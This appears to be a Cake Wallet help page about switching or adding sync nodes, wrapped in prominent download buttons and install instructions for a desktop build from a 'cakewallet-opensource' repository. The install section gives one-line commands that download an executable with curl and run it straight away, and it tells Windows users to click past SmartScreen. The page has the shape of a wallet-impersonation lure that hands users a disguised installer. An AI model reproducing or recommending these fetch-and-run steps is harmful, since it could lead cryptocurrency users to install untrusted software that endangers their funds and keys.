![Cake Wallet change node guide](assets/cake-wallet-change-node-article-banner.png)

# Change or Add a Node in Cake Wallet

Why the connection decides everything, and how to pick a better one.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the wallet's node settings, choose another public node or add your own, and let the wallet reconnect. A node that keeps dropping out is the usual cause of a sync that never finishes or a balance that will not refresh. Changing it costs nothing and is reversible.

<!-- ARTICLE-BODY-BEGIN -->

## Start from the current build
Node lists and connection handling belong to the app version. Install the current release over the one you have, keeping the wallet, so the options below exist in the build you are running.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> and open the wallet before changing settings. An old build may simply have a provider list that no longer works.

## Why the node matters
A wallet does not talk to the network directly; it asks a node. That node returns block data and broadcasts your transactions, so an unreachable one presents as a wallet that is disconnected, stuck on attempting sync, or unable to send.

A node that works for Bitcoin may be useless for Monero: the two use different software and different node lists. Switching because "the node is down" without checking the coin is a common wasted step.

## How to change or add a node
Open the wallet for the coin you are fixing, go to its node settings, and pick another entry from the list or enter your own address and port. Save, then watch the connection state; a working node starts returning block data within seconds.

Your own node removes dependence on someone else's uptime and is the strongest option if you already run one. It does not change your keys or your backup, only where the wallet reads from.

## Privacy of your node choice
A remote node sees which wallet addresses you query and when, which is a real privacy cost even though it cannot spend your funds. That is why serious privacy users run their own node or route through Tor.

Tor and node choice solve different problems and combine well. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md">Use Tor with Cake Wallet</a> explains the network layer, and why a hidden connection still leaves the node itself able to see your queries.

## When the connection is fine
If the wallet syncs and the node is reachable but the balance is still wrong, the problem moved: confirmations, the wrong account, or history that needs a rescan.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Funds not appearing in Cake Wallet</a> orders those checks. Changing nodes repeatedly will not fix a balance that is wrong for a different reason.

## FAQ
### How do I change the node?
In the wallet's node settings, pick another entry or add your own address and port, then save.
### Can I use my own Monero node?
Yes. Point the wallet at your node's address and port; it works the same way as a public one.
### Why does the wallet keep disconnecting?
The node is unreachable or overloaded. Switch to another, or run your own.
### Why do Nano nodes fail to connect?
The configured node is stale or unreachable. Nano uses its own node list, so switch to a live one.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet Monero sync problems](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [use Tor with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) · [funds not appearing in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
